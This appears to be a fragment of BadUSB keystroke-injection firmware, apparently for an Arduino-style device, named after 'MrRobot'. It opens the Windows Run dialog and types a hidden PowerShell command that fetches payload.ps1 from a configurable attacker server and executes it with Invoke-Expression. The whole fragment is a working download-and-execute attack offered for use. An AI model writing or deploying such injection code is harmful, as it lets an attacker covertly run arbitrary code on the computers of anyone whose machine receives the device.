const String SERVER_WEB_ADDR = "http://127.0.0.1/MrRobot"; // Put here the web address of your server WITHOUT the last '/' and WITH 'http://'
GUI(R);
delay(300);
Escribir("powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('" + SERVER_WEB_ADDR + "/payload.ps1'); x " + SERVER_WEB_ADDR);
